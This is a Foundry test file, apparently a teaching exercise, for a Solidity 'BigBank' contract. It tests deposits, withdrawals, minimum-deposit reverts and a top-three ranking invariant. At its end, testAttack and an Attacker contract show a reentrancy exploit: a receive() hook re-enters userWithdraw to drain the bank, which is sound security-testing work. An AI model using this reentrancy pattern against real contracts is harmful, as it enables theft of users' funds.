// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "../src/Bank.sol";

contract BankMock is BigBank {

    address[] public activeUsers; 

    function getOwner() external returns (address) {
        return owner;
    }

    function stake() public payable {
        deposit();
    }

    function balanceOf(address who) public returns(uint256){
        return balances[who];
    }

    function deposit2() payable  public {
        deposit();
        activeUsers.push(msg.sender);
    }
    function userCount() public returns(uint256){
        return activeUsers.length;
    }
}

contract BankTest is Test {
    BankMock bank;

    address admin = makeAddr("myadmin");
    address alice = makeAddr("alice");

    function setUp() public {
        deal(alice, 10000 ether);

        vm.startPrank(admin);
        {
            // 使用管理员身份执行代码
            bank = new BankMock();
        }
        vm.stopPrank();
    }

    function test_Owner() public {
        assertEq(bank.getOwner(), admin, "expect owner is myadmin");
    }

    function test_Deposit() public {
        vm.startPrank(alice);

        uint256 amount = 1 ether;
        (bool success,) = address(bank).call{value: amount}("");
        assertTrue(success, "expect transfer ok!");

        (success,) = address(bank).call{value: amount}("");
        assertTrue(success, "expect transfer ok!");

        uint256 banlace = bank.viewBalance();
        assertEq(banlace, 2 ether, "expect balance is 2 ethers.");
    }


    function testFail_MinDeposit() public {
        vm.startPrank(alice);
        (bool success,) = address(bank).call{value: 0.001 ether}("");
        require(success, "failed");
    }

    /// forge-config: default.fuzz.runs = 100
    function testFuzz_Deposit(uint256 amount) public{
        vm.assume(amount> 0.001 ether);
        deposit(alice,amount);
    }


    mapping(address=>uint256) top3users;
    // 测试Top3 人员的排行不会出现错误
    /// forge-config: default.invariant.runs = 100
    function invariant_TOP3() external {
        
        checkTop3();
        
    }


    function checkTop3() private {
        address[3] memory users = bank.viewTopThree();

        (uint256 a0,uint256 a1,uint256 a2)= (
            bank.balanceOf(users[0]),
            bank.balanceOf(users[1]),bank.balanceOf(users[2]));

        assertGe(a0,a1);
        top3users[users[0]]=1;
        top3users[users[1]]=1;
        top3users[users[2]]=1;

        uint256 amount3=a0;
        if (a0>a1) amount3=a1;
        if (amount3>a2)amount3=a2;
        
        uint256 totalUsers=bank.userCount(); 
        for (uint256 i=0;i<totalUsers;i++){
            address acct = bank.activeUsers(i);

            if (top3users[acct]==0){ 
                uint256 b= bank.balanceOf(acct);
                assertLe(b,amount3,"expect not in top3");
            }
        }
    }

    function deposit(address who,uint256 amount) private{

        deal(who,amount);

        vm.startPrank(who);

        uint256 banlaceBefore = bank.viewBalance();


        (bool success,) = address(bank).call{value:amount}("");
        assertTrue(success,"expect deposit ok!");
        assertEq(bank.viewBalance(),banlaceBefore+amount,"expect balance += amount"  );

        vm.stopPrank();

        checkTop3();
    }

    function test_MinDeposit() public {
        vm.startPrank(alice);

        // 执行成功，代码可以继续
        bank.stake{value: 0.001 ether + 1}();

        // 期望失败，有错误信息
        uint256 amount =0.001 ether;
        bytes memory wantErr=abi.encodeWithSelector(BigBank.AmountNotEnough.selector,amount); 
        console.logBytes(wantErr);
        vm.expectRevert(wantErr);
        bank.stake{value: amount}();
    }

    function withdraw(address who) private{

        uint256 amount= bank.balanceOf(who);
        uint256 balanceBefore= who.balance; // get eth banace
        vm.prank(who);
        bank.userWithdraw();

        //check 
        assertEq(who.balance, balanceBefore+amount,"expect b+=amount");
        assertEq(bank.balanceOf(who),0,"clear");

        checkTop3();

    }

    function test_Withdraw() public {
        vm.startPrank(alice);
        // 没有存款时，则取款失败
        {
            vm.expectRevert(" Balance too low");
            bank.userWithdraw();
        }

        deposit(alice, 1 ether);
        withdraw(alice); 
    }


    function testAttack() public {

        Attacker me = new Attacker(BigBank(payable(address(bank))));
        deposit(alice,11 ether); 
        deposit(address(me),2 ether);

        me.doit();

        assertEq(address(me).balance,10 ether);
    }
}


contract Attacker{

    BigBank bank;

    uint256 times;

    constructor(BigBank bank_) {
        bank=bank_;
    }

    // function deposit() payable public {
    //     address(bank).call{msg.value}("");
    // }

    function doit()  external {
        bank.userWithdraw();
    }

    function withdraw() public {
        //
    }

    receive() external  payable{
        if (times==0){
            // uint256 amount=bank.viewBalance();
            // uint256 banalce= address(bank).balance;
            // if (banalce>=amount) 
            bank.userWithdraw();
            // times++;
        }
        
    }
}
 
